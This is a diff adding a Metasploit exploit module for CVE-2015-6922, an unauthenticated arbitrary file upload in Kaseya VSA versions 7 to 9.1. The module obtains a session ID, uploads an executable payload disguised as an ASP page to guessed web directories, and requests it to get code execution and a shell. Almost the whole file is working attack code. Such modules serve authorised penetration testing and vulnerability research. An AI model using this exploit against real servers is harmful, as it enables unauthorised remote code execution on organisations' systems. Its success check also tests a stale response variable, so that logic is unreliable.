@@ -1,0 +1,132 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name' => 'Kaseya VSA uploader.aspx Arbitrary File Upload',
+      'Description' => %q{
+        This module exploits an arbitrary file upload vulnerability found in Kaseya VSA versions
+        between 7 and 9.1. A malicious unauthenticated user can upload an ASP file to an arbitrary
+        directory leading to arbitrary code execution with IUSR privileges. This module has been
+        tested with Kaseya v7.0.0.17, v8.0.0.10 and v9.0.0.3.
+      },
+      'Author' =>
+        [
+          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and updated MSF module
+        ],
+      'License' => MSF_LICENSE,
+      'References' =>
+        [
+          ['CVE', '2015-6922'],
+          ['ZDI', '15-449'],
+          ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/kaseya-vsa-vuln-2.txt'],
+          ['URL', 'http://seclists.org/bugtraq/2015/Sep/132']
+        ],
+      'Platform' => 'win',
+      'Arch' => ARCH_X86,
+      'Privileged' => false,
+      'Targets' =>
+        [
+          [ 'Kaseya VSA v7 to v9.1', {} ]
+        ],
+      'DefaultTarget' => 0,
+      'DisclosureDate' => 'Sep 23 2015'))
+  end
+
+
+  def check
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri('ConfigTab','uploader.aspx')
+    })
+
+    if res && res.code == 302 && res.body && res.body.to_s =~ /mainLogon\.asp\?logout=([0-9]*)/
+      return Exploit::CheckCode::Detected
+    else
+      return Exploit::CheckCode::Unknown
+    end
+  end
+
+
+  def upload_file(payload, path, filename, session_id)
+    print_status("#{peer} - Uploading payload to #{path}...")
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri('ConfigTab', 'uploader.aspx'),
+      'vars_get' => {
+        'PathData' => path,
+        'qqfile' => filename
+      },
+      'data' => payload,
+      'ctype' => 'application/octet-stream',
+      'cookie' => 'sessionId=' + session_id
+    })
+
+    if res && res.code == 200 && res.body && res.body.to_s.include?('"success": "true"')
+      return true
+    else
+      return false
+    end
+  end
+
+
+  def exploit
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri('ConfigTab','uploader.aspx')
+    })
+
+    if res && res.code == 302 && res.body && res.body.to_s =~ /mainLogon\.asp\?logout=([0-9]*)/
+      session_id = $1
+    else
+      fail_with(Failure::NoAccess, "#{peer} - Failed to create a valid session")
+    end
+
+    asp_name = "#{rand_text_alpha_lower(8)}.asp"
+    exe = generate_payload_exe
+    payload = Msf::Util::EXE.to_exe_asp(exe).to_s
+
+    paths = [
+      # We have to guess the path, so just try the most common directories
+      'C:\\Kaseya\\WebPages\\',
+      'C:\\Program Files\\Kaseya\\WebPages\\',
+      'C:\\Program Files (x86)\\Kaseya\\WebPages\\',
+      'D:\\Kaseya\\WebPages\\',
+      'D:\\Program Files\\Kaseya\\WebPages\\',
+      'D:\\Program Files (x86)\\Kaseya\\WebPages\\',
+      'E:\\Kaseya\\WebPages\\',
+      'E:\\Program Files\\Kaseya\\WebPages\\',
+      'E:\\Program Files (x86)\\Kaseya\\WebPages\\',
+    ]
+
+    paths.each do |path|
+      if upload_file(payload, path, asp_name, session_id)
+        register_files_for_cleanup(path + asp_name)
+        print_status("#{peer} - Executing payload #{asp_name}")
+
+        send_request_cgi({
+          'uri' => normalize_uri(asp_name),
+          'method' => 'GET'
+        })
+
+        # Failure. The request timed out or the server went away.
+        break if res.nil?
+        # Success! Triggered the payload, should have a shell incoming
+        break if res.code == 200
+      end
+    end
+
+  end
+end
